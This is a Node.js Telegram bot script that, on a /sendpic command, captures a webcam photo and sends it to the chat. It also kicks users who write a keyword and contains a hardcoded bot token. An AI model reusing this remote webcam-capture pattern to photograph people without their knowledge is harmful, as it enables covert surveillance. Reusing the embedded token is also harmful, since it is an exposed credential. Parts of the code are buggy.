const TelegramBot = require('node-telegram-bot-api');
const token = '572017543:AAFy1s2YoJf9a6kcUryIaoCKN9jUn9ftV_k';
const bot = new TelegramBot(token, {polling: true});
var express = require('express')
var app = express()
var NodeWebcam = require( 'node-webcam' );
//Default options 
var opts = {
    width: 1920,
    height: 1080,
    quality: 100,
    delay: 0, 
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: false
};

const usr = 454788039;
bot.sendMessage(usr, "start");

bot.on('message', (msg) => {
    const check = "check";
    if (msg.text.toString().toLowerCase().includes(check)) {
        bot.sendMessage(msg.chat.id, "check");
    } 
    const robot = "robot";
    if (msg.text.toString().toLowerCase().includes(robot)) {
        bot.sendMessage(msg.chat.id, "http://www.google.com");
    }
    const swar = "line";
    if (msg.text.includes(swar)) {
        bot.kickChatMember(msg.chat.id,  msg.from.id);
    }
});

bot.onText(/\/keyboard/, (msg) => {
    bot.sendMessage(msg.chat.id, "Select Option", {
        "reply_markup": {
            "keyboard": [["/sendpic", "/openlive"]]
            }
        });
    });

bot.onText(/\/sendpic/, (msg) => {
    var Webcam = NodeWebcam.create( opts );
    Webcam.capture( "test_picture", function( err, data ) {} );
    NodeWebcam.capture( "test_picture", opts, function( err, data ) {
    });
    Webcam.list( function( list ) {
        var anotherCam = NodeWebcam.create( { device: list[ 0 ] } );
    });
    var opts = {
        callbackReturn: "base64"
    };
    NodeWebcam.capture( "test_picture", opts, function( err, data ) {
        var image = "<img src='" + data + "'>";
        bot.sendPhoto(msg.chat.id,"test_picture.jpg",{caption : "Anonymous\nUnknow person"} );
    });
});
